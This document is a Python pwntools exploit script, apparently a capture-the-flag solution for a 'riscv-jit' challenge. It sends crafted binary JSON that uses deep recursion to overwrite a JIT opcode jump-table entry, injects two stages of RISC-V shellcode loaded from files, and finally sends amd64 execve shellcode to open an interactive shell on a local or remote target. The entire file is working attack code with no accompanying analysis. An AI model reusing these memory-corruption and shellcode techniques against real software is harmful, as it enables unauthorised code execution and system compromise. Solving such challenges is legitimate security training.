#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *

context.update(arch="amd64", os="linux")
context.log_level = 'info'

# shortcuts
def sa(delim,data): return p.sendafter(delim,data)
def sla(delim,line): return p.sendlineafter(delim,line)
def sl(line): return p.sendline(line)
def rcu(d1, d2=0):
  p.recvuntil(d1, drop=True)
  # return data between d1 and d2
  if (d2):
    return p.recvuntil(d2,drop=True)

exe = ELF('./riscv-jit')

host, port = "chall.rumble.host", "4141"

if args.REMOTE:
  p = remote(host,port)
else:
  p = process([exe.path,'./b2json.bin'])

json = ''
json = (p8(6)+p32(1))*2014	# user recursion to reach jump table for bjson opcodes
json += p8(0x03)+p32(0x378)	# overwrite entry 5 of table
json += p8(0)+p8(5)
p.sendafter('JSON:\n', json)

#first we jump to 0x378 read, will read data at 0x378 length 0x3e4
payload2 = p32(0xdeadbeef)
# riscv64-linux-gnu-as -march=rv32i -mabi=ilp32 -mlittle-endian -fpic -o example2.o example2.asm && riscv64-linux-gnu-objcopy -O binary example2.o example2.bin
# read first riscv shellcode
f = open('example2.bin','rb')
payload2 += f.read()
f.close()
payload2 = payload2.ljust(0xb0,b'\x00')
payload2 += p32(0xdeadbeef)+p32(0x378+4)
payload2 = payload2.ljust(0x3e4,b'\x00')
p.send(payload2)

# do efence
payload3 = p32(0x100f)
# riscv64-linux-gnu-as -march=rv32i -mabi=ilp32 -mlittle-endian -fpic -o example3.o example3.asm && riscv64-linux-gnu-objcopy -O binary example3.o example3.bin
# read second riscv shellcode
f = open('example3.bin','rb')
payload3 += f.read()
f.close()
payload3 = payload3.ljust(0x100,b'\x00')
p.send(payload3)

# send execve shellcode and got shell
p.send('\x90'*0x20+asm(shellcraft.sh()))


p.interactive()

